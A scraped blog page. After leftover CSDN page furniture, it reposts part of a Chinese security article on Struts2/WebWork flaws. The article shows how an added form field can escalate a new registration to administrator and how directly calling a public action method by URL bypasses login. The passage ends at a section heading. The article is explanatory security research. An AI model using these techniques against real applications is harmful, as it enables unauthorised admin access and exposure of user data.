<p> 0
](<a href="http://www.bshare.cn/share" target="_blank">http://www.bshare.cn/share</a>)
顶 4 踩 0</p>
<p>推荐阅读相关主题： <a href="http://www.csdn.net/article/tag/%E5%B7%A5%E4%BD%9C" title="工作" target="_blank">工作</a> <a href="http://www.csdn.net/article/tag/dns%E6%9C%8D%E5%8A%A1%E5%99%A8" title="dns服务器" target="_blank">dns服务器</a> <a href="http://www.csdn.net/article/tag/%E6%95%B0%E6%8D%AE%E4%B8%AD%E5%BF%83" title="数据中心" target="_blank">数据中心</a> <a href="http://www.csdn.net/article/tag/%E8%B7%AF%E7%94%B1%E5%99%A8" title="路由器" target="_blank">路由器</a> <a href="http://www.csdn.net/article/tag/%E7%94%B5%E4%BF%A1" title="电信" target="_blank">电信</a></p>
<h2 id="-"> </h2>
<ul>
<li>相关文章</li>
<li><p>最新报道</p>
</li>
<li><p><a href="&quot;从谷歌宕机事件认识互联网工作原理&quot;">从谷歌宕机事件认识互联网工作原理</a></p>
</li>
<li><a href="http://www.csdn.net/article/2012-11-21/2812054" title="第二期：“自动避免Namenode的单点故障导致的集群不可用”获奖公布" target="_blank">第二期：“自动避免Namenode的单点故障导致的集群不可用”获奖公布</a></li>
<li><a href="http://www.csdn.net/article/2012-11-20/2812013-apple-google-datacenter-hongkong" title="Apple将在2013年启动香港数据中心的建设" target="_blank">Apple将在2013年启动香港数据中心的建设</a></li>
<li><a href="http://www.csdn.net/article/2012-11-20/2811887-writing-fast-memory-efficient-javascript" title="[实战分析] 编写高效的JavaScript程序" target="_blank">[实战分析] 编写高效的JavaScript程序</a></li>
<li><a href="http://www.csdn.net/article/2012-11-16/2811963-facebook-datacenter" title="Facebook数据中心：气冷也能在高温下运行良好" target="_blank">Facebook数据中心：气冷也能在高温下运行良好</a></li>
<li><p><a href="http://www.csdn.net/article/2012-11-11/2811660-android4.2-jelly-bean" title="揭秘Android 4.2 开发者的天堂与地狱" target="_blank">揭秘Android 4.2 开发者的天堂与地狱</a></p>
</li>
<li><p><a href="&quot;从谷歌宕机事件认识互联网工作原理&quot;">从谷歌宕机事件认识互联网工作原理</a></p>
</li>
<li><a href="http://www.csdn.net/article/2012-11-26/2812219-the-making-of-warcraft-3" title="《Warcraft是怎样炼成的（三）》：从Demo到游戏" target="_blank">《Warcraft是怎样炼成的（三）》：从Demo到游戏</a></li>
<li><a href="http://www.csdn.net/article/2012-11-26/2812211-future-of-programming" title="应用示例和对象是编程的未来吗？" target="_blank">应用示例和对象是编程的未来吗？</a></li>
<li><a href="http://www.csdn.net/article/2012-11-26/2812204-Why-HTML5-provided-more-tricks-than-trea" title="为什么2012年HTML5发展远未达预期" target="_blank">为什么2012年HTML5发展远未达预期</a></li>
<li><a href="http://www.csdn.net/article/2012-11-23/2812180" title="[周报第40期]Amazon环境恶劣为何还能保持创新与成功？" target="_blank">[周报第40期]Amazon环境恶劣为何还能保持创新与成功？</a></li>
<li><a href="http://www.csdn.net/article/2012-11-23/2812176-CTO-Club-87" title="[CTO俱乐部87期]三人行架构分享：开源是背后的支柱" target="_blank">[CTO俱乐部87期]三人行架构分享：开源是背后的支柱</a></li>
</ul>
<h2 id="-"> </h2>
<p>已有2条评论</p>
<h3 id="-500-">还可以再输入500个字</h3>
<p><img src="" alt=""> 您还没有登录!  请<a href="">登录</a> 或<a href="https://passport.csdn.net/account/register" target="_blank">注册</a></p>
<h3 id="-"> </h3>
<ul>
<li>最新评论</li>
<li>最热评论</li>
</ul>
<p><a href="http://my.csdn.net/hejinlove" target="_blank"><img src="" alt=""></a> <a href="http://my.csdn.net/hejinlove" target="_blank">hejinlove</a> 55分钟前</p>
<p>长见识了
0票，来自<a href="">+1</a><a href="">更多</a> <a href="">回复</a></p>
<p><a href="http://weibo.com/u/1712448143" target="_blank"><img src="" alt=""></a> <a href="http://weibo.com/u/1712448143" target="_blank">猫公子他哥</a> 2小时前  来自 新浪微博</p>
<p>好文!
0票，来自<a href="">+1</a><a href="">更多</a> <a href="">回复</a>
共2个 共1页 <a href="">首页</a>  <a href="">上一页</a> <a href="">1</a> <a href="">下一页</a>  <a href="">末页</a></p>
<p>请您注意</p>
<ul>
<li>·自觉遵守：爱国、守法、自律、真实、文明的原则</li>
<li>·尊重网上道德，遵守《全国人大常委会关于维护互联网安全的决定》及中华人民共和国其他各项有关法律法规</li>
<li>·严禁发表危害国家安全，破坏民族团结、国家宗教政策和社会稳定，含侮辱、诽谤、教唆、淫秽等内容的作品</li>
<li>·承担一切因您的行为而直接或间接导致的民事或刑事法律责任</li>
<li>·您在CSDN新闻评论发表的作品，CSDN有权在网站内保留、转载、引用或者删除</li>
<li><p>·参与本评论即表明您已经阅读并接受上述条款</p>
</li>
<li><p>CSDN官方微信</p>
</li>
<li>扫描二维码,向CSDN吐槽</li>
<li>微信号：CSDNnews
<img src="" alt=""></li>
</ul>
<p><img src="" alt=""><a href="http://subject.csdn.net/programmer-ipad/" target="_blank">程序员杂志for iPad 免费下载</a>
<a href="http://www.csdn.net/article/lastnews" target="_blank">每日资讯快速浏览</a></p>
<h2 id="-"> </h2>
<p>微博关注</p>
<h2 id="-"> </h2>
<p>相关热门文章</p>
<ul>
<li><a href="http://www.csdn.net/article/2012-11-21/2812109-If-Amazon-has-a-bad-work-environment-wit" title="Amazon工作环境恶劣员工高流失率 为何却依然能持续成功和创新？" target="_blank">Amazon工作环境恶劣员工高流失率 为何却依然能持续成功和创新？</a></li>
<li><a href="http://www.csdn.net/article/2012-11-22/2812154-Ten-Trouble-Programmers" title="程序员的十大烦恼" target="_blank">程序员的十大烦恼</a></li>
<li><a href="http://www.csdn.net/article/2012-11-22/2812132-responsive-image" title="响应式图像技术与资源分享" target="_blank">响应式图像技术与资源分享</a></li>
<li><a href="http://www.csdn.net/article/2012-11-21/2812056-programmers" title="当程序不再工作时，程序员说" target="_blank">当程序不再工作时，程序员说</a></li>
<li><a href="http://www.csdn.net/article/2012-11-21/2812033-Systems-Programming-at-Twitter" title="Twitter的系统编程" target="_blank">Twitter的系统编程</a></li>
<li><a href="http://www.csdn.net/article/2012-11-23/2812174-5-Good-and-useful-.NET-Profilers" title="推荐5款超实用的.NET性能分析工具" target="_blank">推荐5款超实用的.NET性能分析工具</a></li>
<li><a href="http://www.csdn.net/article/2012-11-22/2812113-The-Nature-Of-Lisp" title="Lisp的本质" target="_blank">Lisp的本质</a></li>
<li><a href="http://www.csdn.net/article/2012-11-26/2812219-the-making-of-warcraft-3" title="《Warcraft是怎样炼成的（三）》：从Demo到游戏" target="_blank">《Warcraft是怎样炼成的（三）》：从Demo到游戏</a></li>
<li><a href="http://www.csdn.net/article/2012-11-26/2812204-Why-HTML5-provided-more-tricks-than-trea" title="为什么2012年HTML5发展远未达预期" target="_blank">为什么2012年HTML5发展远未达预期</a></li>
<li><a href="http://www.csdn.net/article/2012-11-26/2812211-future-of-programming" title="应用示例和对象是编程的未来吗？" target="_blank">应用示例和对象是编程的未来吗？</a></li>
</ul>
<h2 id="-"> </h2>
<p><a href="http://hui.csdn.net/" target="_blank">活动</a></p>
<p>11-26 <a href="http://hui.csdn.net/MeetingInfo.aspx?mid=174" target="_blank">交付创新的应用：CSDN年度创新应用访谈（CMDN Club /#22）</a> 11-30 <a href="http://hui.csdn.net/MeetingInfo.aspx?mid=173" target="_blank">IBM Rational 软件创新中国分享会—深圳站</a> 11-22 <a href="http://hui.csdn.net/MeetingInfo.aspx?mid=172" target="_blank">2012移动互联网应用创新大赛开放日-全国六场联动厦门站</a> 11-22 <a href="http://hui.csdn.net/MeetingInfo.aspx?mid=171" target="_blank">2012移动互联网应用创新大赛开放日-全国六场联动成都站</a> 11-22 <a href="http://hui.csdn.net/MeetingInfo.aspx?mid=170" target="_blank">2012移动互联网应用创新大赛开放日-全国六场联动深圳站</a> 11-22 <a href="http://hui.csdn.net/MeetingInfo.aspx?mid=169" target="_blank">2012移动互联网应用创新大赛开放日-全国六场联动南京站</a></p>
<h1 id="-">热门专区</h1>
<ul>
<li><a href="http://subject.csdn.net/win8hackathon/" target="_blank"><img src="" alt=""></a><a href="http://subject.csdn.net/win8hackathon/" target="_blank">win8开发马拉松</a></li>
<li><a href="http://g.csdn.net/5232350" target="_blank"><img src="" alt=""></a><a href="http://g.csdn.net/5232350" target="_blank">2012微软技术大会</a></li>
<li><a href="http://db2.csdn.net/" target="_blank"><img src="" alt=""></a><a href="http://db2.csdn.net/" target="_blank">数据库构架师专区</a></li>
<li><a href="http://www.aixdev.org/" target="_blank"><img src="" alt=""></a><a href="http://www.aixdev.org/" target="_blank">IBM AIX学院</a></li>
<li><a href="http://hc.csdn.net/" target="_blank"><img src="" alt=""></a><a href="http://hc.csdn.net/" target="_blank">异构编程专区</a></li>
</ul>
<p><a href="http://www.csdn.net/company/about.html" target="_blank">公司简介</a>|<a href="http://www.csdn.net/company/recruit.html" target="_blank">招贤纳士</a>|<a href="http://www.csdn.net/company/marketing.html" target="_blank">广告服务</a>|<a href="http://www.csdn.net/company/account.html" target="_blank">银行汇款帐号</a>|<a href="http://www.csdn.net/company/contact.html" target="_blank">联系方式</a>|<a href="http://www.csdn.net/company/statement.html" target="_blank">版权声明</a>|<a href="http://www.csdn.net/company/layer.html" target="_blank">法律顾问</a>|<a href="mailto:webmaster@csdn.net">问题报告</a>京 ICP 证 070598 号北京创新乐知信息技术有限公司 版权所有<img src="" alt=""> 联系邮箱：webmaster(at)csdn.netCopyright © 1999-2012, CSDN.NET, All Rights Reserved <a href="http://www.hd315.gov.cn/beian/view.asp?bianhao=010202001032100010" target="_blank"><img src="" alt="GongshangLogo"></a></p>
<p><a href="http://www.bshare.cn/intro" target="_blank">分享到</a><a href="">X</a></p>
<p><a href="&quot;115收藏夹&quot;">115收藏夹</a></p>
<p><a href="&quot;139邮箱&quot;">139邮箱</a>
<a href="&quot;189邮箱&quot;">189邮箱</a></p>
<p><a href="&quot;手机快传&quot;">手机快传</a>
<a href="&quot;42区&quot;">42区</a></p>
<p><a href="&quot;豆瓣9点&quot;">豆瓣9点</a>
<a href="&quot;百度搜藏&quot;">百度搜藏</a></p>
<p><a href="&quot;百度空间&quot;">百度空间</a>
<a href="&quot;Google书签&quot;">Google书签</a></p>
<p><a href="&quot;一键通&quot;">一键通</a>
<a href="&quot;财迷&quot;">财迷</a></p>
<p><a href="&quot;中金微博&quot;">中金微博</a>
<a href="&quot;微长沙&quot;">微长沙</a></p>
<p><a href="&quot;车主微博&quot;">车主微博</a>
<a href="&quot;抽屉&quot;">抽屉</a></p>
<p><a href="&quot;复制网址&quot;">复制网址</a>
<a href="&quot;中青论坛&quot;">中青论坛</a></p>
<p><a href="&quot;创业吧&quot;">创业吧</a>
<a href="&quot;美味书签&quot;">美味书签</a></p>
<p><a href="&quot;点点网&quot;">点点网</a>
<a href="&quot;递客网&quot;">递客网</a></p>
<p><a href="&quot;Digg&quot;">Digg</a>
<a href="&quot;奇客发现&quot;">奇客发现</a></p>
<p><a href="&quot;Diigo&quot;">Diigo</a>
<a href="&quot;豆瓣网&quot;">豆瓣网</a></p>
<p><a href="&quot;梦幻人生&quot;">梦幻人生</a>
<a href="&quot;堆糖&quot;">堆糖</a></p>
<p><a href="&quot;东方微博&quot;">东方微博</a>
<a href="&quot;电子邮件&quot;">电子邮件</a></p>
<p><a href="&quot;Evernote&quot;">Evernote</a>
<a href="&quot;Facebook&quot;">Facebook</a></p>
<p><a href="&quot;饭否&quot;">饭否</a>
<a href="&quot;收藏夹&quot;">收藏夹</a></p>
<p><a href="&quot;飞信&quot;">飞信</a>
<a href="&quot;FriendFeed&quot;">FriendFeed</a></p>
<p><a href="&quot;Fwisp&quot;">Fwisp</a>
<a href="&quot;赶牛微博&quot;">赶牛微博</a></p>
<p><a href="&quot;Gmail&quot;">Gmail</a>
<a href="&quot;光明网&quot;">光明网</a></p>
<p><a href="&quot;光明微博&quot;">光明微博</a>
<a href="&quot;Google+&quot;">Google+</a></p>
<p><a href="&quot;谷歌翻译&quot;">谷歌翻译</a>
<a href="&quot;合肥微博&quot;">合肥微博</a></p>
<p><a href="&quot;黑米书签&quot;">黑米书签</a>
<a href="&quot;和讯微博&quot;">和讯微博</a></p>
<p><a href="&quot;花瓣&quot;">花瓣</a>
<a href="&quot;凤凰快博&quot;">凤凰快博</a></p>
<p><a href="&quot;凤凰微博&quot;">凤凰微博</a>
<a href="&quot;粉丝网&quot;">粉丝网</a></p>
<p><a href="&quot;Instapaper&quot;">Instapaper</a>
<a href="&quot;i贴吧&quot;">i贴吧</a></p>
<p><a href="&quot;开心集品&quot;">开心集品</a>
<a href="&quot;好愿网&quot;">好愿网</a></p>
<p><a href="&quot;微江苏&quot;">微江苏</a>
<a href="&quot;江西微博&quot;">江西微博</a></p>
<p><a href="&quot;开心网&quot;">开心网</a>
<a href="&quot;唠叨网&quot;">唠叨网</a></p>
<p><a href="&quot;雷猴&quot;">雷猴</a>
<a href="&quot;乐收&quot;">乐收</a></p>
<p><a href="&quot;乐知书签&quot;">乐知书签</a>
<a href="&quot;LinkedIn&quot;">LinkedIn</a></p>
<p><a href="&quot;MS Livespace&quot;">MS Livespace</a>
<a href="&quot;麦库记事&quot;">麦库记事</a></p>
<p><a href="&quot;麻辣微博&quot;">麻辣微博</a>
<a href="&quot;玛撒网&quot;">玛撒网</a></p>
<p><a href="&quot;美丽说&quot;">美丽说</a>
<a href="&quot;米聊&quot;">米聊</a></p>
<p><a href="&quot;明道&quot;">明道</a>
<a href="&quot;Mister Wong&quot;">Mister Wong</a></p>
<p><a href="&quot;蘑菇街&quot;">蘑菇街</a>
<a href="&quot;猫扑推客&quot;">猫扑推客</a></p>
<p><a href="&quot;MSN&quot;">MSN</a>
<a href="&quot;MyShare&quot;">MyShare</a></p>
<p><a href="&quot;MySpace&quot;">MySpace</a>
<a href="&quot;网易微博&quot;">网易微博</a></p>
<p><a href="&quot;Netvibes&quot;">Netvibes</a>
<a href="&quot;人民微博&quot;">人民微博</a></p>
<p><a href="&quot;Pinterest&quot;">Pinterest</a>
<a href="&quot;Poco网&quot;">Poco网</a></p>
<p><a href="&quot;打印&quot;">打印</a>
<a href="&quot;Print Friendly&quot;">Print Friendly</a></p>
<p><a href="&quot;奇乐收藏&quot;">奇乐收藏</a>
<a href="&quot;腾讯微博&quot;">腾讯微博</a></p>
<p><a href="&quot;QQ书签&quot;">QQ书签</a>
<a href="&quot;朋友网&quot;">朋友网</a></p>
<p><a href="&quot;QQ空间&quot;">QQ空间</a>
<a href="&quot;ReadItLater&quot;">ReadItLater</a></p>
<p><a href="&quot;Reddit&quot;">Reddit</a>
<a href="&quot;红微博&quot;">红微博</a></p>
<p><a href="&quot;人间网&quot;">人间网</a>
<a href="&quot;人脉库&quot;">人脉库</a></p>
<p><a href="&quot;人人网&quot;">人人网</a>
<a href="&quot;手机&quot;">手机</a></p>
<p><a href="&quot;新浪微博&quot;">新浪微博</a>
<a href="&quot;新浪Qing&quot;">新浪Qing</a></p>
<p><a href="&quot;新浪Vivi&quot;">新浪Vivi</a>
<a href="&quot;搜狐白社会&quot;">搜狐白社会</a></p>
<p><a href="&quot;搜狐随身看&quot;">搜狐随身看</a>
<a href="&quot;搜狐微博&quot;">搜狐微博</a></p>
<p><a href="&quot;南方微博&quot;">南方微博</a>
<a href="&quot;StumbleUpon&quot;">StumbleUpon</a></p>
<p><a href="&quot;深圳微博&quot;">深圳微博</a>
<a href="&quot;守株网&quot;">守株网</a></p>
<p><a href="&quot;淘江湖&quot;">淘江湖</a>
<a href="&quot;天际网&quot;">天际网</a></p>
<p><a href="&quot;天涯&quot;">天涯</a>
<a href="&quot;同学微博&quot;">同学微博</a></p>
<p><a href="&quot;推他&quot;">推他</a>
<a href="&quot;Tumblr&quot;">Tumblr</a></p>
<p><a href="&quot;Twitter&quot;">Twitter</a>
<a href="&quot;优士网&quot;">优士网</a></p>
<p><a href="&quot;挖客&quot;">挖客</a>
<a href="&quot;玩啥e族&quot;">玩啥e族</a></p>
<p><a href="&quot;若邻网&quot;">若邻网</a>
<a href="&quot;WO+分享&quot;">WO+分享</a></p>
<p><a href="&quot;我烧网&quot;">我烧网</a>
<a href="&quot;鲜果网&quot;">鲜果网</a></p>
<p><a href="&quot;校媒采通&quot;">校媒采通</a>
<a href="&quot;新华微博&quot;">新华微博</a></p>
<p><a href="&quot;新民微博&quot;">新民微博</a>
<a href="&quot;微博校园&quot;">微博校园</a></p>
<p><a href="&quot;摇篮微博&quot;">摇篮微博</a>
<a href="&quot;移动微博&quot;">移动微博</a></p>
<p><a href="&quot;易集网&quot;">易集网</a>
<a href="&quot;有道书签&quot;">有道书签</a></p>
<p><a href="&quot;有道笔记&quot;">有道笔记</a>
<a href="&quot;浙江微博&quot;">浙江微博</a>
<a href="http://www.bshare.cn/bShareBox" target="_blank">查看我的分享...</a></p>
<p><a href="http://www.bshare.cn/" target="_blank">bShare</a>
<a href="http://www.bshare.cn/intro" target="_blank">分享到</a><a href="">X</a></p>
<p><a href="">腾讯微博</a></p>
<p><a href="">一键通</a>
<a href="">新浪微博</a></p>
<p><a href="&quot;QQ空间&quot;">QQ空间</a></p>
<p><a href="&quot;人人网&quot;">人人网</a>
<a href="&quot;天涯&quot;">天涯</a></p>
<p><a href="&quot;凤凰微博&quot;">凤凰微博</a>
<a href="&quot;朋友网&quot;">朋友网</a></p>
<p><a href="&quot;人民微博&quot;">人民微博</a>
<a href="&quot;豆瓣网&quot;">豆瓣网</a>
<a href="&quot;搜狐微博&quot;">搜狐微博</a></p>
<p><a href="&quot;新华微博&quot;">新华微博</a>
<a href="&quot;手机&quot;">手机</a></p>
<p><a href="&quot;网易微博&quot;">网易微博</a>
<a href="&quot;开心网&quot;">开心网</a></p>
<p><a href="&quot;百度空间&quot;">百度空间</a>
<a href="&quot;有道笔记&quot;">有道笔记</a>
更多平台... (127)</p>
<p><a href="http://www.bshare.cn/" target="_blank">bShare</a></p>

      
    </div>
    
    
      
    
    
        <footer id="post-meta">
        <span class="categories">Posted in<span class="breadcrumb fa fa-folder"><li><a href="/categories/安全/">安全</a></li></span></span> | <span class="tags">Tagged <a href="/tags/安全/" class="label label-primary">安全</a></span> | <span class="time">recent updated:<time title="2014-03-07 09:54:38"datetime="2014-03-07 09:54:38"> mar. 7 2014</time></span> | <span class="comment-link">
<a href="http://itsolife.com/2014/02/02/2014-02-02-安全--从谷歌宕机事件认识互联网工作原理-CSDNNET/#comments" class="ds-thread-count comment-link" data-thread-key="2014-02-02-安全--从谷歌宕机事件认识互联网工作原理-CSDNNET" data-count-type="comments">暂无评论</a></span>
        </footer>
    
    <div class="clearfix"></div>
  </div>
</div>
</article>



  <article>
<div id="post" class="post well">
  <div class="post-content">
    <header class="well-sm">
      <i class="fa icon fa-5x pull-left"></i>
      <h1 class="title"><a href="/2014/02/02/2014-02-02-安全-Java--Struts2框架安全缺陷/">Struts2框架安全缺陷</a></h1>
      
        <span>Posted on<time datetime="2014-02-02T01:54:38.000Z"> <a href="/2014/02/02/2014-02-02-安全-Java--Struts2框架安全缺陷/">feb. 2 2014</a></time></span>      
    </header>
    
    
    <div class="entry">
      
        <h1 id="struts2-">Struts2框架安全缺陷</h1>
<h1 id="-secinn-http-secinn-appspot-com-home-secinn-"><a href="http://secinn.appspot.com/home" title="Secinn" target="_blank">Secinn</a></h1>
<ul>
<li><a href="http://secinn.appspot.com/home" target="_blank">Home</a></li>
<li><a href="http://secinn.appspot.com/pstzine" target="_blank">Webzine</a></li>
<li><a href="http://secinn.appspot.com/planet?site=cn" target="_blank">Planet(China)</a></li>
<li><a href="http://secinn.appspot.com/planet?site=intl" target="_blank">Planet(Worldwide)</a></li>
<li><a href="http://secinn.appspot.com/about" target="_blank">About</a></li>
</ul>
<p>Webzine<a href="http://secinn.appspot.com/pstzine/read?issue=4" target="_blank">Issue /#4</a><a href="http://secinn.appspot.com/pstzine/read?issue=3" target="_blank">Issue /#3</a><a href="http://secinn.appspot.com/pstzine/read?issue=2" target="_blank">Issue /#2</a><a href="http://secinn.appspot.com/pstzine/read?issue=1" target="_blank">Issue /#1</a><a href="mailto:root@ph4nt0m.org">投稿</a>Search<a href="http://secinn.appspot.com/search?type=internal" target="_blank">站内搜索</a><a href="http://secinn.appspot.com/search?type=internet" target="_blank">搜索全网安全咨询</a>RSS<a href="http://secinn.appspot.com/planet/feed?site=cn" target="_blank">Planet(China) Feed</a><a href="http://secinn.appspot.com/planet/feed?site=intl" target="_blank">Planet(Worldwide) Feed</a><a href="http://secinn.appspot.com/planet/feed?site=all" target="_blank">Planet(All) Feed</a>Links<a href="http://www.ph4nt0m.org/" target="_blank">Ph4nt0m Security Team</a><a href="http://bbs.ph4nt0m.org/" target="_blank">Mail-List</a> ## WebZine</p>
<ul>
<li><a href="http://secinn.appspot.com/pstzine/read?issue=4&amp;articleid=1" target="_blank">Introduction ---------- by root</a></li>
<li><a href="http://secinn.appspot.com/pstzine/read?issue=4&amp;articleid=2" target="_blank">Flashsky访谈 ---------- by flashsky</a></li>
<li><a href="http://secinn.appspot.com/pstzine/read?issue=4&amp;articleid=3" target="_blank">Struts2框架安全缺陷 ---------- by kxlzx</a></li>
<li><a href="http://secinn.appspot.com/pstzine/read?issue=4&amp;articleid=4" target="_blank">重谈IP欺骗技术 ---------- by papaya</a></li>
<li><a href="http://secinn.appspot.com/pstzine/read?issue=4&amp;articleid=5" target="_blank">Fuzz客户端存储对象，寻找client ddos ---------- by woyigui</a></li>
<li><a href="http://secinn.appspot.com/pstzine/read?issue=4&amp;articleid=6" target="_blank">应用软件缺陷利用的一点心得(Webkit篇) ---------- by wushi</a></li>
<li><a href="http://secinn.appspot.com/pstzine/read?issue=4&amp;articleid=7" target="_blank">Bypassing Linux kernel module version check ---------- by wzt</a></li>
<li><a href="http://secinn.appspot.com/pstzine/read?issue=4&amp;articleid=8" target="_blank">ACS - Active Content Signatures ---------- by Eduardo Vela Nava</a></li>
<li><a href="http://secinn.appspot.com/pstzine/read?issue=4&amp;articleid=9" target="_blank">卡巴虚拟机启发式查毒的绕过方法 ---------- by dangdang</a>  <h3 id="struts2-">Struts2框架安全缺陷</h3>
</li>
</ul>
<p>By kxlzx</p>
<h3 id="-">摘要</h3>
<p>本文介绍了java开发流行框架struts2以及webwork的一些安全缺陷，并举例说明框架本身以及开发人员使用 框架时，所产生的种种安全问题，以及作者挖掘框架安全漏洞的一些心得体会。</p>
<h3 id="-">推荐以下人群阅读</h3>
<p>了解java开发 了解框架开发 了解web application安全 “网络安全爱好者”</p>
<h3 id="-">正文</h3>
<p>当前java开发网站，通常不会是纯JSP的，大都使用了java framework。 有了这些framework，让开发人员更加快速的开发出代码，也让代码非常具有可扩展性，那些分层架构的思想， 更是深入人心。这些也大大影响了安全代码审核，曾提出“分层审核代码”的思想，比如在DAO层专门检查 sql注入，在view层检查xss等。这些框架都有自己的层级，本次文章主要讲的是struts这个框架的相关 安全问题，也会有小部分涉及到struts后面的DAO层。 而struts这个框架更新占有市场份额极大的一个框架，它在各个层级中，位于如图所示位置： <img src="" alt=""> 可以看到struts在web应用中，负责处理接收用户数据，调用业务处理，以及展示数据的工作。所以本文把 struts的功能分为controller层和view层，controller层来完成接收用户数据，分发用户请求，而view专门 用于展示数据。 一个单独的struts，是不合逻辑的，因为架构师通常喜欢多种框架集合，让它们各自负责某一层的处理。 研究一个框架的安全问题，不能仅仅站在框架的角度，还应该充分考虑到开发人员是如何使用这些框架的， 他们最喜欢写什么样的代码，这样才能还原一个正常的、完整的web应用场景。 从搜索结果看，互联网中，绝大多数教程推荐struts+hibernate+spring这样的黄金组合，那么，我假设有 一个应用使用了这个组合，以struts为重点，站在攻击者的角度，层层分析struts的设计缺陷。</p>
<h3 id="struts2-">Struts2开发回顾与简单学习</h3>
<p>为了让大家回顾或者学习一下struts2，我们一起来建立一个action、jsp页面，做一个接收用户输入，之后 处理一下，再展示出来给用户的过程，精通struts2的同学可以跳过此步。 -------------------------------------struts回顾start 首先建立action，叫做AaaaAction： public class AaaaAction extends ActionSupport{ private String name; public String getName() { return name; } public void setName(String name) { this.name = name; } public String execute(){ System.out.println(&quot;exe&quot;); return SUCCESS; } public String bbb(){ System.out.println(&quot;bbbbb&quot;); return SUCCESS; } } 请注意execute这个方法，让用户输入action的地址后，默认会访问这个方法。 之后配置struts.xml文件 <action name="aaaaaaa" class="net.inbreak.AaaaAction"> <result name="success">user/aaa.jsp</result> </action> 配置这个文件后，当用户输入 <a href="http://www.inbreak.net/app/aaaaaaa.action">http://www.inbreak.net/app/aaaaaaa.action</a> 的时候，struts会负责让AaaaAction中的execute方法处理用户请求。 处理之后，该方法返回“return SUCCESS;”，struts又负责找到result的name是seccuess所指向的jsp页面。 把该页面解析后，返回给用户。 而用户看到的就是aaa.jsp页面的html代码。 struts2继承了webwork的所有优点，其实等于是webwork的升级，如果开发人员想让用户直接访问action中的 某方法，而不是访问默认的execute方法，只要定义一个方法叫做bbb，并且是public的，用户就可以直接输入 <a href="http://www.inbreak.net/app/aaaaaaa!bbb.action" target="_blank">http://www.inbreak.net/app/aaaaaaa!bbb.action</a> 直接访问了bbb方法。 那request中的参数如果接收呢？struts2中，这个过程被包装了起来，使用非常方便，只要在action中定义 一个属性，叫做public String name；。然后加入getName和setName方法，就可以像正常使用属性一样，接收到 用户传递过来的变量。无论是get请求还是post请求，都可以使用这种方式接收用户输入。 整个过程就如此简单，现在大家对流程有了了解，我们就开始讨论正文，如果还是想了解更多，请自行google。 ----------------------------------struts回顾end</p>
<h3 id="struts2-">Struts2安全缺陷</h3>
<p>可以看到struts2在数据流向方面，有两个重点，一个是进入（in），一个是输出（out）。而我在做漏洞 挖掘的思路，也是跟着这个数据的流程，开始分析的，下面我们就开始让数据进入。 Action属性默认值可以被覆盖缺陷： 在日常的java项目中，我们经常会遇到保存一个新的对象（比如注册一个用户），然后给这个对象赋予一些 用户提交上来的属性值，在这里，只需要定义一个对象类： public class User { private Long id=0l; private String name; private String pass; private Integer type=1; 。。。下面的get和set方法代码略 } 定义后，在action中，添加一个属性 User reguser; 用户注册的页面代码如下： <form XXXXXXX> <input name="reguser.name"> 当用户提交这个form到action中后，struts2会负责自动映射reguser.name的值到reguser的相关属性（name） 中，所以在execute这个方法中，就可以使用reguser.getName()拿到用户提交的reguser.name的值。所以我们 下面的代码就很简单了： public String execute(){ add(user); add方法，更简单了，因为我们项目中集成了hibernate，这个框架自动映射user类中的各个属性，自动组成 insert语句。我们只要在add中调用session.save(user);就可以保存用户到数据库中。 前文提到那么多“简单”两个字，难道这些过程都是安全的而他给我们仅仅带来了方便么？ struts2只负责映射所有对象，他提供了form验证，也只能验证form中属性值的内容，比如email格式等， 并不能约束用户提交其他属性上来，于是这就变成了十分危险的功能。 当User中有个属性type，代表User是否管理员时（1为普通用户，2为管理员），麻烦来了，攻击者在原来的 注册表单中，新加入一个input，叫做 <input name="reguser.type"> 然后输入值是2，把这个值一起交给action。在这个流程中，这个值，当然也会被自动带到数据库中，向下 处理的逻辑中，这个用户，就已经变成管理员了。 当你看到了一个struts2或者webwork的应用，可以尝试使用属性攻击，修改当前表单，里面有所有你猜测到 的属性，一并提交上来，就可能会影响整个逻辑，达到攻击目的。文中仅仅是一个例子，事实上，在数据传递 的过程中，可以任意覆盖数据的默认值，本来就是一个危险的缺陷，而struts2和webwork这两个框架仅仅看到 了它带来的好处，忽略了这方面基于安全性的考虑，仅仅关注了用户提交数据的正确性。对比在没有struts2 这个功能的时候，我们却需要在action中一个一个的把需要的变量，从用户提交的request中解出来，一个一个 处理，不可能出现这种安全问题。现在它包装了这个过程，自以为很方面，却出了严重问题。</p>
<h3 id="action-">Action中的方法被暴力猜解缺陷</h3>
<p>前文提到，有一种方法可以让用户访问action时，不访问默认的execute方法，而是直接访问其他action中 的方法，条件是在action中，写一个public的方法。开发人员如果需要做一个登陆后，展示所有用户列表的 功能，而他的一个“解耦合”的开发习惯，将在这里导致安全缺陷。 定义一个如下的action public class Userlogin extends ActionSupport{ private String uname=&quot;&quot;; private String upwd; private List list; //getter and setter 方法略 public String login(){ if(uname!=null&amp;&amp;upwd!=null&amp;&amp;uname.equals(&quot;kxlzx&quot;)&amp;&amp;upwd.equals(&quot;pass&quot;)) {//if login success return list(); } return false; } public String list(){ list.add(&quot;kxlzx&quot;);list.add(&quot;kxlzx1&quot;);list.add(&quot;kxlzx2&quot;);list.add(&quot;kxlzx3&quot;); return &quot;list&quot;; } } Userlogin中，因为list这个功能（显示所有用户列表），其实是一个通用的功能，很容易被其他地方调用， 所以开发人员把它单独写成了一个方法。 当用户登陆的时候，打开 <a href="http://www.inbreak.net/app/userlogin!login.action" target="_blank">http://www.inbreak.net/app/userlogin!login.action</a> 来到了用户的登陆页面，可以看到，只有用户输入正确的用户名和密码，才能最终调用list()方法，显示结果。 <img src="" alt=""> 但是struts2把所有public的方法都暴露了出去，导致现在用户输入了 <a href="http://www.inbreak.net/app/userlogin!list.action" target="_blank">http://www.inbreak.net/app/userlogin!list.action</a> 用户访问这个链接后，struts2调用list方法，然后返回结果给用户，所以没有登陆，就显示了所有用户信息， 直接绕过了login中的登陆验证。 <img src="" alt=""> 在没有struts2的时候，我们要在servlet的doget或者dopost方法中，写if判断等代码，才能让用户调用其他 servlet中的方法，现在看来其实这也是一种保护措施。而现在struts2为了方便开发，把所有的public方法 统一映射了出去，导致开发把一个经常使用的功能，习惯写成一个public的方法，现在居然成了严重漏洞。</p>
<h3 id="struts2-action-">struts2的action属性设计缺陷</h3>
